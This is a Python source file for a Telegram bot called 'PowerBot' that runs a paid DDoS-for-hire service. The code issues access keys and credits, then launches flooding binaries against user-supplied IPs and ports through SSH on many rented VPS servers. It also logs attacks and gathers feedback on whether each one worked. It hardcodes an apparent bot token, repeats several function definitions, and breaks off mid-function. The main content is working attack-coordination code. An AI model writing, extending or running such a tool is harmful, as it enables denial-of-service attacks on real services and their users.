#!/usr/bin/env python3
import subprocess
import sys
import threading
import time
import json
import os
import uuid
import traceback
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import paramiko
import telebot
from telebot import types
import re
from html import escape

# Function for logging execution errors
def log_execution(message_text):
    """Log messages with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("execution_logs.txt", 'a') as f:
        f.write(f"[{timestamp}] {message_text}\n")

# Configuration
BOT_TOKEN = '8168943059:AAHb2Jj4Xv-5bmLegY8qQ2aNfhlF190p2Vc'
BOT_OWNER_IDS = [7688337621,7816069263]
APPROVED_CHAT_IDS = []

# File paths
VPS_FILE = "vps_servers.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
BLOCKED_USERS_FILE = "blocked_users.json"
LOGS_FILE = "execution_logs.txt"
ADMIN_CREDITS_FILE = "admin_credits.json"
APPROVED_CHATS_FILE = "approved_chats.json"
FILE_TRACKER_FILE = "file_tracker.json"
VIDEO_URLS_FILE = "video_urls.json"
VIDEOS_DIR = "videos"
ADMIN_USERS_FILE = "admin_users.json"
ADMIN_LOGS_FILE = "admin_logs.json"
ATTACK_LOGS_FILE = "attack_logs.txt"
ATTACK_FEEDBACK_FILE = "attack_feedback.json"
ELITE_USERS_FILE = "elite_users.json"
CHUNK_SIZE = 239  # For elite attacks

ROLES = {
    "OWNER": {
        "permissions": [
            "full_control",
            "manage_admins",
            "manage_credits",
            "modify_system",
            "view_all_logs",
            "generate_unrestricted_keys",
            "block_users",
            "bypass_restrictions"
        ]
    },
    "ADMIN": {
        "permissions": [
            "generate_keys",
            "view_user_stats",
            "manage_user_keys",
            "block_users",
            "view_limited_logs"
        ]
    }
}

# Global settings
global_max_duration = 60
global_cooldown = 300
attack_cooldowns = {}

# Initialize threading objects
log_lock = threading.Lock()
cancel_event = threading.Event()
running_channels = {}

# ---------------------------
# Decorator Definitions
# ---------------------------

def owner_only(func):
    """Restrict command to bot owners only"""
    def wrapper(message, *args, **kwargs):
        if message.from_user.id not in BOT_OWNER_IDS:
            safe_reply(message, "👑 Owner-only command.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def safe_handler(func):
    """Error handling decorator"""
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_trace = traceback.format_exc()
            log_execution(f"❌ Error in {func.__name__}: {error_trace}")
            safe_reply(message, f"<b>❌ Error:</b> {str(e)}")
    return wrapper

def load_json(filename, default):
    """Load JSON data from file or return default if file doesn't exist"""
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except Exception as e:
            log_execution(f"Error loading {filename}: {e}")
    return default

def save_json(filename, data):
    """Save data to JSON file"""
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        log_execution(f"Error saving {filename}: {e}")

# Initialize video storage
if not os.path.exists(VIDEOS_DIR):
    os.makedirs(VIDEOS_DIR)

# Load existing video metadata
video_urls = load_json(VIDEO_URLS_FILE, [])

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# ThreadPoolExecutor for parallel tasks
executor = ThreadPoolExecutor(max_workers=10)

# Global variables for execution cancellation and logging
running_channels = {}  # Maps thread name to its SSH channel
cancel_event = threading.Event()
log_lock = threading.Lock()

# ---------------------------
# Helper Functions
# ---------------------------

@bot.message_handler(content_types=['video'])
@owner_only
@safe_handler
def handle_video(message):
    """Store videos using Telegram's file_id system"""
    try:
        video_data = {
            'file_id': message.video.file_id,  # The key to perfect quality
            'width': message.video.width,
            'height': message.video.height,
            'duration': message.video.duration,
            'mime_type': message.video.mime_type,
            'date_added': datetime.now().isoformat(),
            'file_size': message.video.file_size,
            'caption': message.caption or ""
        }
        
        video_urls.append(video_data)
        save_json(VIDEO_URLS_FILE, video_urls)
        
        safe_reply(message, f"""<b>✅ Video Added (Perfect Quality)</b>
┌─────────────────────────────
│ Dimensions: {message.video.width}x{message.video.height}
│ Duration: {message.video.duration}s
│ Size: {message.video.file_size//1024} KB
└─────────────────────────────""")
    except Exception as e:
        safe_reply(message, f"""<b>❌ Error Saving Video</b>
┌─────────────────────────────
│ {str(e)}
└─────────────────────────────""")
      
@bot.message_handler(commands=['removevideo'])
@owner_only
@safe_handler
def handle_remove_video(message):
    """Remove a video by ID"""
    try:
        if len(message.text.split()) < 2:
            safe_reply(message, """<b>❓ Usage:</b>
┌─────────────────────────────
│ /removevideo <video_id>
└─────────────────────────────""")
            return
            
        video_id = message.text.split()[1]
        removed = False
        
        for video in video_urls[:]:
            if video['file_path'].split('/')[-1].startswith(video_id):
                try:
                    os.remove(video['file_path'])
                except FileNotFoundError:
                    pass
                video_urls.remove(video)
                removed = True
                break
                
        if removed:
            save_json(VIDEO_URLS_FILE, video_urls)
            safe_reply(message, f"""<b>✅ Video Removed</b>
┌─────────────────────────────
│ ID: <code>{video_id}</code>
└─────────────────────────────""")
        else:
            safe_reply(message, f"""<b>❌ Video Not Found</b>
┌─────────────────────────────
│ ID: <code>{video_id}</code>
└─────────────────────────────""")
    except Exception as e:
        safe_reply(message, f"""<b>❌ Error</b>
┌─────────────────────────────
│ {str(e)}
└─────────────────────────────""")

@bot.message_handler(commands=['listvideos'])
@owner_only
@safe_handler
def handle_list_videos(message):
    """List all stored videos"""
    if not video_urls:
        safe_reply(message, """<b>ℹ️ No Videos Stored</b>
┌─────────────────────────────
│ Upload videos to attach them
└─────────────────────────────""")
        return
        
    response = """╔════════════════════════════╗
<b><u>🎥 STORED VIDEOS 🎥</u></b>
╚════════════════════════════╝
"""
    for idx, video in enumerate(video_urls, 1):
        filename = video['file_path'].split('/')[-1]
        size = os.path.getsize(video['file_path']) // 1024
        response += f"""┌─────────────────────────────
│ <b>{idx}.</b> ID: <code>{filename.split('.')[0]}</code>
│ Date: {video['date_added']}
│ Size: {size} KB
└─────────────────────────────
"""
    safe_reply(message, response)

def is_owner(user_id):
    """Check if user is an owner"""
    return user_id in BOT_OWNER_IDS

def is_admin(user_id):
    """Check if user is an admin (has credit balance)"""
    return str(user_id) in admin_credits

def is_approved_user(user_id):
    """Check if user is approved (has a valid, unexpired key)"""
    user_id_str = str(user_id)
    if user_id_str not in users:
        return False
    
    user_key = users[user_id_str]
    if user_key not in keys:
        return False
    
    # Check expiration
    key_data = keys[user_key]
    expires_at = datetime.fromisoformat(key_data["expires_at"])
    if datetime.now() > expires_at:
        return False
    
    return True
def clean_expired_keys():
    """Remove expired keys and their users"""
    expired_keys = []
    for key, key_data in list(keys.items()):
        expires_at = datetime.fromisoformat(key_data["expires_at"])
        if datetime.now() > expires_at:
            expired_keys.append(key)
    
    for key in expired_keys:
        # Remove users associated with this key
        users_to_remove = [uid for uid, k in users.items() if k == key]
        for uid in users_to_remove:
            del users[uid]
        # Remove the key itself
        del keys[key]
    
    if expired_keys:
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)

def is_chat_approved(chat_id):
    """Check if chat is approved"""
    return chat_id in APPROVED_CHAT_IDS

def format_timedelta(td):
    """Format timedelta into human-readable string"""
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def sanitize_message(text):
    """Sanitize message while preserving Telegram HTML formatting and ensuring tags are balanced"""
    # First, ensure all <key> tags are properly converted to <code>
    sanitized_text = re.sub(r'<key>', '<code>', text)
    sanitized_text = re.sub(r'</key>', '</code>', sanitized_text)
    
    # Then escape all HTML special characters
    sanitized_text = escape(sanitized_text)
    
    # Now properly handle Telegram-supported tags
    supported_tags = ['b', 'i', 'u', 'code', 'pre']
    for tag in supported_tags:
        # Replace opening tags
        sanitized_text = re.sub(
            rf'&lt;({tag})&gt;', 
            rf'<\1>', 
            sanitized_text
        )
        # Replace closing tags
        sanitized_text = re.sub(
            rf'&lt;/({tag})&gt;', 
            rf'</\1>', 
            sanitized_text
        )
    
    # Finally, validate that all opening tags have closing tags
    stack = []
    i = 0
    while i < len(sanitized_text):
        if sanitized_text.startswith('<', i):
            end = sanitized_text.find('>', i)
            if end == -1:
                break  # Invalid HTML, skip
            tag = sanitized_text[i+1:end]
            if tag.startswith('/'):
                # Closing tag
                tag_name = tag[1:]
                if stack and stack[-1] == tag_name:
                    stack.pop()
            else:
                # Opening tag - only push if it's a supported tag
                if tag in supported_tags:
                    stack.append(tag)
            i = end + 1
        else:
            i += 1
    
    # If there are unclosed tags, close them
    while stack:
        tag = stack.pop()
        sanitized_text += f'</{tag}>'
    
    return sanitized_text

def safe_send(chat_id, text, parse_mode="HTML", reply_markup=None):
    """Send a message with proper HTML formatting and error handling"""
    try:
        sanitized_text = sanitize_message(text)
        # Validate the HTML before sending
        try:
            bot.send_message(chat_id, "HTML validation test", parse_mode="HTML")
        except:
            # If HTML validation fails, fall back to plain text
            bot.send_message(chat_id, sanitized_text, parse_mode=None, reply_markup=reply_markup)
            return
        
        # If validation passed, send with HTML
        bot.send_message(chat_id, sanitized_text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        log_execution(f"Error sending message to {chat_id}: {e}")
        try:
            # Final fallback - send as plain text
            plain_text = re.sub(r'<[^>]+>', '', text)  # Remove all tags
            bot.send_message(chat_id, plain_text, parse_mode=None, reply_markup=reply_markup)
        except Exception as e2:
            log_execution(f"Critical error sending fallback message to {chat_id}: {e2}")

def safe_reply(message, text, parse_mode="HTML"):
    """Reply to a message with proper HTML formatting and error handling"""
    try:
        sanitized_text = sanitize_message(text)
        # Validate the HTML before sending
        try:
            bot.reply_to(message, "HTML validation test", parse_mode="HTML")
        except:
            # If HTML validation fails, fall back to plain text
            bot.reply_to(message, sanitized_text, parse_mode=None)
            return
        
        # If validation passed, send with HTML
        bot.reply_to(message, sanitized_text, parse_mode=parse_mode)
    except Exception as e:
        log_execution(f"Error replying to message from {message.from_user.id}: {e}")
        try:
            # Final fallback - send as plain text
            plain_text = re.sub(r'<[^>]+>', '', text)  # Remove all tags
            bot.reply_to(message, plain_text, parse_mode=None)
        except Exception as e2:
            log_execution(f"Critical error sending fallback reply to {message.from_user.id}: {e2}")

def safe_reply(message, text, parse_mode="HTML"):
    """Reply to a message with proper HTML formatting"""
    sanitized_text = sanitize_message(text)
    try:
        bot.reply_to(message, sanitized_text, parse_mode=parse_mode)
    except Exception as e:
        log_execution(f"Error replying to message from {message.from_user.id}: {e}")
        
def safe_reply(message, text, parse_mode="HTML"):
    """Reply to a message with sanitization"""
    sanitized_text = sanitize_message(text)
    try:
        bot.reply_to(message, sanitized_text, parse_mode=parse_mode)
    except Exception as e:
        log_execution(f"Error replying to message from {message.from_user.id}: {e}")

def execute_own_vps_command(target_ip, target_port, duration):
    """Execute the binary on the current machine (your own VPS)"""
    try:
        command = f'./venom {target_ip} {target_port} {duration} 300 > /dev/null 2>&1 &'
        subprocess.Popen(command, shell=True)
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executed on own VPS: {command}")
    except Exception as e:
        print(f"❌ Error executing command on own VPS: {e}")

# ---------------------------
# Data Initialization
# ---------------------------
vps_servers = load_json(VPS_FILE, [])
keys = load_json(KEYS_FILE, {})
users = load_json(USERS_FILE, {})
blocked_users = load_json(BLOCKED_USERS_FILE, [])
admin_credits = load_json(ADMIN_CREDITS_FILE, {})
APPROVED_CHAT_IDS = load_json(APPROVED_CHATS_FILE, [])
file_tracker = load_json(FILE_TRACKER_FILE, {})
admin_users = load_json(ADMIN_USERS_FILE, {})
elite_users = load_json(ELITE_USERS_FILE, {})

# Initialize owner credits if not exists
for owner_id in BOT_OWNER_IDS:
    if str(owner_id) not in admin_credits:
        admin_credits[str(owner_id)] = {
            "balance": 1000000,
            "history": [{
                "type": "add",
                "amount": 1000000,
                "reason": "Initial owner credit",
                "timestamp": datetime.now().isoformat()
            }]
        }
        save_json(ADMIN_CREDITS_FILE, admin_credits)

# ---------------------------
# Credit System Functions
# ---------------------------
def add_credit(user_id, amount, reason=""):
    """Add credit to user's balance"""
    user_id_str = str(user_id)
    if user_id_str not in admin_credits:
        admin_credits[user_id_str] = {"balance": 0, "history": []}
    
    admin_credits[user_id_str]["balance"] += amount
    admin_credits[user_id_str]["history"].append({
        "type": "add",
        "amount": amount,
        "reason": reason,
        "timestamp": datetime.now().isoformat()
    })
    save_json(ADMIN_CREDITS_FILE, admin_credits)

def deduct_credit(user_id, amount, reason=""):
    """Deduct credit from user's balance"""
    user_id_str = str(user_id)
    if user_id_str not in admin_credits:
        return False
    
    if admin_credits[user_id_str]["balance"] < amount:
        return False
    
    admin_credits[user_id_str]["balance"] -= amount
    admin_credits[user_id_str]["history"].append({
        "type": "deduct",
        "amount": amount,
        "reason": reason,
        "timestamp": datetime.now().isoformat()
    })
    save_json(ADMIN_CREDITS_FILE, admin_credits)
    return True

def get_credit_balance(user_id):
    """Get user's current credit balance"""
    return admin_credits.get(str(user_id), {"balance": 0})["balance"]

def get_credit_history(user_id):
    """Get user's credit history"""
    return admin_credits.get(str(user_id), {"history": []})["history"]

def calculate_key_cost(validity_minutes, max_users, max_duration):
    """Calculate cost for generating a key"""
    validity_cost = (validity_minutes + 14) // 15  # 1 credit per 15 minutes
    users_cost = max_users * 10  # 10 credits per user slot
    duration_cost = (max_duration + 29) // 30  # 1 credit per 30 seconds
    return validity_cost + users_cost + duration_cost
def log_attack(user_id, target, port, duration, success_count):
    """Log attack details to a file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} | User: {user_id} | Target: {target}:{port} | Duration: {duration}s | Success: {success_count} VPS\n"
    with open(ATTACK_LOGS_FILE, "a") as f:
        f.write(log_entry)

def send_attack_feedback_request(message, target, port, duration):
    """Send feedback buttons after attack completes"""
    markup = types.InlineKeyboardMarkup()
    btn_worked = types.InlineKeyboardButton("✅ Worked", callback_data=f"feedback_worked_{target}_{port}")
    btn_failed = types.InlineKeyboardButton("❌ Failed", callback_data=f"feedback_failed_{target}_{port}")
    markup.add(btn_worked, btn_failed)
    
    feedback_msg = f"""╔════════════════════════════╗
<b><u>📢 ATTACK FEEDBACK 📢</u></b>
╚════════════════════════════╝
┌─────────────────────────────
│ Target: <code>{target}:{port}</code>
│ Duration: {duration}s
└─────────────────────────────
<b>Did this attack work?</b>"""
    bot.send_message(message.chat.id, feedback_msg, reply_markup=markup)

def execute_chunked_attack(target_ip, target_port, total_duration, chunk_size=CHUNK_SIZE):
    """Execute attack in chunks across different VPS"""
    chunks = []
    remaining = total_duration
    while remaining > 0:
        current_chunk = min(chunk_size, remaining)
        chunks.append(current_chunk)
        remaining -= current_chunk
    
    for i, chunk_duration in enumerate(chunks):
        vps_index = i % len(vps_servers)
        vps = vps_servers[vps_index]
        threading.Thread(
            target=execute_command,
            args=(vps, target_ip, target_port, chunk_duration),
            daemon=True
        ).start()
        time.sleep(chunk_duration)

def log_admin_action(admin_id, action, details=None):
    """Log all admin actions"""
    log_entry = {
        "admin_id": admin_id,
        "action": action,
        "timestamp": datetime.now().isoformat(),
        "details": details or {}
    }
    admin_logs = load_json(ADMIN_LOGS_FILE, [])
    admin_logs.append(log_entry)
    save_json(ADMIN_LOGS_FILE, admin_logs)

# ---------------------------
# Message Handling Decorators
# ---------------------------
def private_chat_only(func):
    """Restrict command to private chats only"""
    def wrapper(message, *args, **kwargs):
        if message.chat.type != "private":
            bot.reply_to(message, "🔒 This command only works in private chats.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def approved_chat_only(func):
    """Restrict command to approved chats only"""
    def wrapper(message, *args, **kwargs):
        if not is_chat_approved(message.chat.id) and message.chat.type != "private":
            bot.reply_to(message, "🚫 This chat is not approved for commands.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def owner_only(func):
    """Restrict command to bot owners only"""
    def wrapper(message, *args, **kwargs):
        if not is_owner(message.from_user.id):
            bot.reply_to(message, "👑 Owner-only command.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def admin_only(func):
    """Restrict command to admins only"""
    def wrapper(message, *args, **kwargs):
        if not is_admin(message.from_user.id):
            bot.reply_to(message, "🛡️ Admin-only command.")
            return
        return func(message, *args, **kwargs)
    return wrapper

def user_only(func):
    """Restrict command to registered users with valid keys"""
    def wrapper(message, *args, **kwargs):
        if not is_approved_user(message.from_user.id):
            # Run cleanup in case keys expired
            clean_expired_keys()
            
            safe_reply(message, """╔════════════════════════════╗
<b><u>🔑 KEY REQUIRED 🔑</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ Your key has expired or been
│ revoked. Please register a
│ new key with /usekey
└─────────────────────────────""")
            return
        return func(message, *args, **kwargs)
    return wrapper

def safe_handler(func):
    """Error handling decorator"""
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_trace = traceback.format_exc()
            log_execution(f"❌ Error in {func.__name__}: {error_trace}")
            safe_reply(message, f"<b>❌ Error:</b> {str(e)}")
    return wrapper

# ---------------------------
# Reply Message Templates
# ---------------------------
def get_welcome_message():
    return """🌟 <b>Welcome to PowerBot!</b> 🌟

🔹 <b>Key Features:</b>
• Advanced DDoS Protection Bypass
• Multi-VPS Attack Coordination
• Smart Resource Management
• Real-time Monitoring

📌 <b>Getting Started:</b>
1. Register with /usekey <key>
2. Launch attacks with /attack
3. Manage settings via /help

🔒 <b>Security:</b>
• End-to-end encrypted
• IP masking
• Automatic cleanup

💎 <b>Premium:</b>
Contact @Owner for elite access"""

def get_attack_started_message(target, port, duration, vps_count):
    return f"""🚀 <b>Attack Launched!</b>

🎯 <b>Target:</b> <code>{target}:{port}</code>
⏱️ <b>Duration:</b> {duration} seconds
🖥️ <b>VPS Count:</b> {vps_count}

<b>Status:</b> Initiating flood...
<b>ETA:</b> Calculating...

🔔 You'll be notified when complete."""

def get_attack_completed_message(target, port, duration, success_count):
    return f"""✅ <b>Attack Completed!</b>

🎯 <b>Target:</b> <code>{target}:{port}</code>
⏱️ <b>Duration:</b> {duration} seconds
🟢 <b>Success:</b> {success_count} VPS

<b>Results:</b>
• Packets Sent: ~{success_count * 10000}
• Estimated Impact: High
• Cleanup: Complete

🔄 Ready for next target!"""

def get_vps_added_message(ip):
    return f"""🖥️ <b>VPS Added Successfully!</b>

<b>IP:</b> <code>{ip}</code>
<b>Status:</b> Verified & Active
<b>Resources:</b> Monitoring...

✅ Now available for attacks"""

def get_key_generated_message(key, expires, users, duration):
    return f"""🔑 <b>New Key Generated!</b>

<code>{key}</code>

<b>Validity:</b> {expires}
<b>Max Users:</b> {users}
<b>Max Duration:</b> {duration}s

💡 Share carefully!"""

def get_admin_stats_message():
    stats = f"""📊 <b>System Statistics</b>

<b>Users:</b> {len(users)}
<b>Active Keys:</b> {len(keys)}
<b>VPS Nodes:</b> {len(vps_servers)}
<b>Blocked Users:</b> {len(blocked_users)}

<b>Recent Activity:</b>
• Last Attack: {datetime.now().strftime('%Y-%m-%d %H:%M')}
• System Uptime: 99.9%
• Resource Usage: Optimal"""

    return stats

# ---------------------------
# File Management Functions
# ---------------------------
def add_file_to_vps(vps, file_path, file_content):
    """Add file to a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        
        sftp = client.open_sftp()
        with sftp.file(file_path, 'w') as f:
            f.write(file_content)
        
        # Set executable permission if appropriate
        if file_path.endswith(('.sh', '.bin', '.py')):
            client.exec_command(f'chmod +x {file_path}')
        
        sftp.close()
        client.close()
        return True
    except Exception as e:
        log_execution(f"Error adding file to {vps['ip']}: {e}")
        return False

def remove_file_from_vps(vps, file_path):
    """Remove file from a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        client.exec_command(f'rm -f {file_path}')
        client.close()
        return True
    except Exception as e:
        log_execution(f"Error removing file from {vps['ip']}: {e}")
        return False

def list_files_on_vps(vps, directory="."):
    """List files on a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        
        stdin, stdout, stderr = client.exec_command(f'ls -l {directory}')
        files = stdout.read().decode()
        
        client.close()
        return files if files else "No files found"
    except Exception as e:
        log_execution(f"Error listing files on {vps['ip']}: {e}")
        return f"Error: {str(e)}"

# ---------------------------
# Remote Command Execution via SSH
# ---------------------------
def execute_command(vps, target_ip, target_port, duration):
    try:
        command = f'nohup ./aj {target_ip} {target_port} {duration} > /dev/null 2>&1 &'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        channel = stdout.channel
        thread_name = threading.current_thread().name
        running_channels[thread_name] = channel
        while not channel.exit_status_ready():
            if cancel_event.is_set():
                channel.close()
                break
            time.sleep(1)
        try:
            output = stdout.read().decode('utf-8', errors='replace')
            error_output = stderr.read().decode('utf-8', errors='replace')
        except Exception as read_err:
            output = f"❌ Error reading output: {read_err}"
            error_output = ""
        log_execution(f"📡 Output from {vps['ip']}: {output} {error_output}")
        print(f"📡 Output from {vps['ip']}:\n{output}\n{error_output}")
    except Exception as e:
        log_execution(f"❌ Error connecting to {vps['ip']}: {e}")
        print(f"❌ Error connecting to {vps['ip']}: {e}")
    finally:
        thread_name = threading.current_thread().name
        if thread_name in running_channels:
            del running_channels[thread_name]
        try:
            client.close()
        except Exception:
            pass
@bot.message_handler(commands=['attacklogs'])
@owner_only
@safe_handler
def send_attack_logs(message):
    """Send the attack logs to the owner with a stylish caption"""
    try:
        with open(ATTACK_LOGS_FILE, "rb") as f:
            bot.send_document(message.chat.id, f, caption="📜 <b>Attack Logs</b> - Here's the detailed record of all attacks performed.")
    except FileNotFoundError:
        safe_reply(message, """╔════════════════════════════╗
<b><u>❌ No Logs Found ❌</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ We couldn't locate any attack logs.
│ Please ensure logs are generated first.
└─────────────────────────────""")

@bot.message_handler(commands=['attackstats'])
@owner_only
@safe_handler
def show_attack_stats(message):
    """Display detailed attack stats with success rate"""
    feedback_data = load_json(ATTACK_FEEDBACK_FILE, {"total": 0, "worked": 0, "failed": 0})
    total, worked = feedback_data["total"], feedback_data["worked"]
    success_rate = (worked / total) * 100 if total > 0 else 0

    safe_reply(message, f"""╔════════════════════════════╗
<b><u>📊 Attack Stats</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Total Attacks:</b> {total}
│ <b>Successful Attacks:</b> {worked}
│ <b>Failed Attacks:</b> {feedback_data["failed"]}
│ <b>Success Rate:</b> {success_rate:.1f}% ({worked}/{total})
└─────────────────────────────""")

@bot.message_handler(commands=['elite'])
@safe_handler
def check_elite_status(message):
    """Check and display the user's elite status"""
    is_elite = str(message.from_user.id) in elite_users
    safe_reply(message, f"""╔════════════════════════════╗
<b><u>💎 Elite Status</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Status:</b> {'✅ Yes' if is_elite else '❌ No'}
└─────────────────────────────""")

@bot.callback_query_handler(func=lambda call: call.data.startswith('feedback_'))
def handle_feedback(call):
    """Record feedback for each attack"""
    action, target, port = call.data.split('_')[1:]
    feedback_data = load_json(ATTACK_FEEDBACK_FILE, {"total": 0, "worked": 0, "failed": 0, "details": []})

    feedback_data["total"] += 1
    feedback_data["worked" if action == "worked" else "failed"] += 1
    feedback_data["details"].append({
        "user_id": call.from_user.id,
        "target": f"{target}:{port}",
        "result": action,
        "timestamp": datetime.now().isoformat()
    })

    save_json(ATTACK_FEEDBACK_FILE, feedback_data)
    bot.answer_callback_query(call.id, f"Feedback recorded: <b>{action.capitalize()}</b> for {target}:{port}")

# ---------------------------
# Command Handlers
# ---------------------------
@bot.message_handler(commands=['start'])
@safe_handler
def send_welcome(message):
    if message.from_user.id in blocked_users:
        safe_reply(message, """╔════════════════════════════╗
<b><u>🚫 ACCESS DENIED 🚫</u></b>
╚════════════════════════════╝

You are blocked from using this bot!""")
        return
    
    welcome_msg = """╔════════════════════════════╗
<b><u>🌟 WELCOME TO POWERBOT 🌟</u></b>
╚════════════════════════════╝

<b>🔹 Key Features:</b>
┌─────────────────────────────
│ • 🛡️ Advanced DDoS Protection Bypass
│ • 🌐 Multi-VPS Attack Coordination
│ • ⚡ Smart Resource Management
│ • 📊 Real-time Monitoring
└─────────────────────────────

<b>📌 Getting Started:</b>
┌─────────────────────────────
│ 1️⃣ Register with /usekey <key>
│ 2️⃣ Launch attacks with /attack
│ 3️⃣ Manage settings via /help
└─────────────────────────────

<b>🔒 Security:</b>
┌─────────────────────────────
│ • 🔐 End-to-end encrypted
│ • 🎭 IP masking
│ • 🧹 Automatic cleanup
└─────────────────────────────

<b>💎 Premium:</b>
┌─────────────────────────────
│ Contact @Owner for elite access
└─────────────────────────────"""
    
    # Send welcome message
    safe_reply(message, welcome_msg)
    
    # Send random video using Telegram's file_id (Method 2)
    if video_urls:
        try:
            video = random.choice(video_urls)
            bot.send_video(
                chat_id=message.chat.id,
                video=video['file_id'],
                caption="Here's a random video from our collection!",
                duration=video.get('duration', 0),
                width=video.get('width', 1920),
                height=video.get('height', 1080),
                supports_streaming=True,
                parse_mode='HTML',
                disable_notification=False
            )
        except Exception as e:
            log_execution(f"Error sending video: {str(e)}")
            try:
                # Fallback to document if video send fails
                bot.send_document(
                    chat_id=message.chat.id,
                    document=video['file_id'],
                    caption="Here's a video from our collection!"
                )
            except Exception as e2:
                log_execution(f"Fallback failed: {str(e2)}")

def get_key_generated_message(key, expires, users, duration):
    return f"""╔════════════════════════════╗
<b><u>🔑 NEW KEY GENERATED 🔑</u></b>
╚════════════════════════════╝

<code>{key}</code>

┌─────────────────────────────
│ <b>Validity:</b> ⏳ {expires}
│ <b>Max Users:</b> 👥 {users}
│ <b>Max Duration:</b> ⏱️ {duration}s
└─────────────────────────────

<i>💡 Share carefully!</i>"""

def get_admin_stats_message():
    stats = f"""╔════════════════════════════╗
<b><u>📊 SYSTEM STATISTICS 📊</u></b>
╚════════════════════════════╝

┌─────────────────────────────
│ <b>Users:</b> 👥 {len(users)}
│ <b>Active Keys:</b> 🔑 {len(keys)}
│ <b>VPS Nodes:</b> 🖥️ {len(vps_servers)}
│ <b>Blocked Users:</b> 🚫 {len(blocked_users)}
└─────────────────────────────

┌─────────────────────────────
│ <b>Recent Activity:</b>
│ • ⏱️ Last Attack: {datetime.now().strftime('%Y-%m-%d %H:%M')}
│ • ⏳ System Uptime: 99.9%
│ • 💻 Resource Usage: Optimal
└─────────────────────────────"""
    return stats
@bot.message_handler(commands=['migratevideos'])
@owner_only
def migrate_videos(message):
    """One-time migration from local files to file_id system"""
    for video in video_urls[:]:
        if 'file_path' in video and 'file_id' not in video:
            try:
                with open(video['file_path'], 'rb') as f:
                    msg = bot.send_video(message.chat.id, f)
                video['file_id'] = msg.video.file_id
                save_json(VIDEO_URLS_FILE, video_urls)
                os.remove(video['file_path'])
            except Exception as e:
                log_execution(f"Migration failed: {str(e)}")
    
    safe_reply(message, "✅ Migration completed")



# ---------------------------
# File Management Functions
# ---------------------------
def add_file_to_vps(vps, file_path, file_content):
    """Add file to a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        
        sftp = client.open_sftp()
        with sftp.file(file_path, 'w') as f:
            f.write(file_content)
        
        # Set executable permission if appropriate
        if file_path.endswith(('.sh', '.bin', '.py')):
            client.exec_command(f'chmod +x {file_path}')
        
        sftp.close()
        client.close()
        return True
    except Exception as e:
        log_execution(f"Error adding file to {vps['ip']}: {e}")
        return False

def remove_file_from_vps(vps, file_path):
    """Remove file from a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        client.exec_command(f'rm -f {file_path}')
        client.close()
        return True
    except Exception as e:
        log_execution(f"Error removing file from {vps['ip']}: {e}")
        return False

def list_files_on_vps(vps, directory="."):
    """List files on a specific VPS"""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        
        stdin, stdout, stderr = client.exec_command(f'ls -l {directory}')
        files = stdout.read().decode()
        
        client.close()
        return files if files else "No files found"
    except Exception as e:
        log_execution(f"Error listing files on {vps['ip']}: {e}")
        return f"Error: {str(e)}"

# ---------------------------
# Remote Command Execution via SSH
# ---------------------------
def execute_command(vps, target_ip, target_port, duration):
    try:
        command = f'nohup ./venom {target_ip} {target_port} {duration} 400 > /dev/null 2>&1 &'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        channel = stdout.channel
        thread_name = threading.current_thread().name
        running_channels[thread_name] = channel
        while not channel.exit_status_ready():
            if cancel_event.is_set():
                channel.close()
                break
            time.sleep(1)
        try:
            output = stdout.read().decode('utf-8', errors='replace')
            error_output = stderr.read().decode('utf-8', errors='replace')
        except Exception as read_err:
            output = f"❌ Error reading output: {read_err}"
            error_output = ""
        log_execution(f"📡 Output from {vps['ip']}: {output} {error_output}")
        print(f"📡 Output from {vps['ip']}:\n{output}\n{error_output}")
    except Exception as e:
